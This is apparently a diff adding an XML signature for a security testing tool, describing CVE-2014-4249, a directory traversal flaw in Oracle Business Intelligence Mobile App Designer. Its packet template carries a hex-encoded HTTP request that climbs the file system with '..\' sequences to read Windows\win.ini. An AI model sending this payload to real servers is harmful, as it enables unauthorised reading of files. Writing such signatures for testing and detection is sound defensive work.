@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Oracle Business Intelligence Mobile App Designer Information Disclosure"/>
+    <EngDesc display="true" value="An information disclosure vulnerability exists in Oracle Business Intelligence Mobile App Designer. The vulnerability is due to insufficient input validation of certain parameters, which can allow an attacker to traverse the file system and access files. A remote, unauthenticated attacker could exploit this vulnerability by sending a crafted request to the vulnerable application. Successful exploitation could result in the disclosure of arbitrary files. Tester should turn variable $destPort into 7001 before test."/>
+    <Intent display="true">
+      <item value="DIRECTORY_TRAVERSAL"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Oracle"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Business_Intelligence_Mobile_App_Designer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="11.1.1.7_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140716-17"/>
+    <CVEID display="true" value="CVE-2014-4249"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="109086"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="b1fae4871ad6ed21e583cf81800309ff"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="LOW"/>
+    <Authentication display="false" value="NONE"/>
+    <ConfImpact display="false" value="PARTIAL"/>
+    <IntegImpact display="false" value="NONE"/>
+    <AvailImpact display="false" value="NONE"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635447564787007585"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1415961043" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="B"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="C"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:5D:B7" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00BD" Identification="AED3" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="29AE" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="55845" destPort="$destPort" SeqNumber="E0F85C6D" AckNumber="9CE9742A" HeaderLength="08" WindowSize="002E" Checksum="79F7" UrgentPointer="0000" Options="0101080A576CF2BE038BD86D" Payload="474554202F6D6F62696C652F6361626F2F7374796C65732F63616368652F2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C57696E646F77735C77696E2E696E6920485454502F312E310D0A486F73743A203137322E31362E382E3135313A373030310D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
